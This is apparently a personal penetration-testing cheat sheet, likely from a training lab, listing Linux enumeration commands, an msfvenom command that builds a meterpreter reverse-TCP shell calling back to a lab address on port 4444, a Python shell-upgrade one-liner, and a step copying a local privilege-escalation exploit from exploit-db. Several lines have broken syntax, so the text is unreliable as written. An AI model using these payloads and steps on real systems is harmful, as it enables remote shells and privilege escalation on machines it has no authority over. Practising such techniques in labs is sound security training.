# command_sheet

`netstat -antp | grep sshd`
` ss -lntu`

```shell

uname -a
uname -i can show architecture but sometimes unknown
ps aux
netstat antup
cat /etc/*-release
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.11.0.152 LPORT 4444 -f elf -o shell

python -c 'import pty;pty.spawn('/bin/sh')'

cp usr/share/exploitdb/platforms/linux/local/40611.c ```